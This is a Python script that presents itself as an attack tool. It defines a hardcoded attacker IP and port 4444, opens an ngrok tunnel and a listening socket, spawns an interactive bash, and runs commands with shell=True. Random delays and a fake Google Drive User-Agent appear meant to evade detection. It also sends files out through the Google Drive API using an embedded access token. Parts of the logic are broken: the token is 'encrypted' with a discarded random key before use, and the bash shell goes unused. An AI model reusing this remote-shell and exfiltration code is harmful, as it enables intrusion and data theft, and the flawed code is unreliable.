import subprocess
import time
import socket
import base64
import os
import random
import shutil
import requests
from Crypto.Cipher import ARC4
import secrets

BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def generate_random_key(length):
    return secrets.token_bytes(length)

def get_attacker_info():
    attacker_ip = "192.168.10.50"
    return attacker_ip

def encrypt_access_token(token, key_length):
    key = generate_random_key(key_length)
    cipher = ARC4.new(key)
    encrypted_token = cipher.encrypt(token.encode())
    return base64.b64encode(encrypted_token).decode()

def main():
    try:
        access_token = "AIzaSyAnNQcVAuVcUC3cjfsEVLdD378wMJaXKc0"
        ip = get_attacker_info()
        port = "4444"
        key_length = int("64")

        print(GREEN + "[*] Starting ngrok tunnel..." + RESET)
        ngrok_process = subprocess.Popen(['ngrok', 'tcp', port])
        time.sleep(3)

        access_token_encrypted = encrypt_access_token(access_token, key_length)

        headers = {
            "Authorization": f"Bearer {access_token_encrypted}",
            "Content-Type": "application/json",
            "User-Agent": "GoogleDrive-API-Client/1.0",
            "Connection": "keep-alive",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9"
        }

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, int(port)))
        s.listen(1)
        print(YELLOW + "[!] Waiting for incoming connection..." + RESET)
        client_socket, addr = s.accept()

        shell = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        while True:
            command = input(RED + "Enter a command to execute (or type 'exit' to quit): " + RESET)
            if command.lower() == "exit":
                break

            time.sleep(random.uniform(1, 5))

            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            stdout = result.stdout
            stderr = result.stderr

            client_socket.send(command.encode())
            client_socket.send(stdout.encode())
            client_socket.send(stderr.encode())
            if command.lower() == "upload":
                file_path = input("Enter the path of the file to upload: ")
                file_name = os.path.basename(file_path)
                with open(file_path, "rb") as f:
                    file_data = f.read()
                url = "https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
                response = requests.post(url, headers=headers, data=file_data)
                client_socket.send(response.text.encode())

            elif command.lower() == "download":
                file_path = input("Enter the path of the file to download: ")
                url = f"https://www.googleapis.com/drive/v3/files/{file_path}?alt=media"
                response = requests.get(url, headers=headers)
                with open(os.path.basename(file_path), "wb") as f:
                    f.write(response.content)
                client_socket.send("File downloaded successfully.".encode())

            elif command.lower() == "list_files":
                url = "https://www.googleapis.com/drive/v3/files"
                response = requests.get(url, headers=headers)
                client_socket.send(response.text.encode())

            else:
                client_socket.send(stdout.encode())
                client_socket.send(stderr.encode())

        client_socket.close()
        s.close()
        ngrok_process.terminate()

    except Exception as e:
        print(RED + f"Error: {e}" + RESET)

if __name__ == "__main__":
    main()
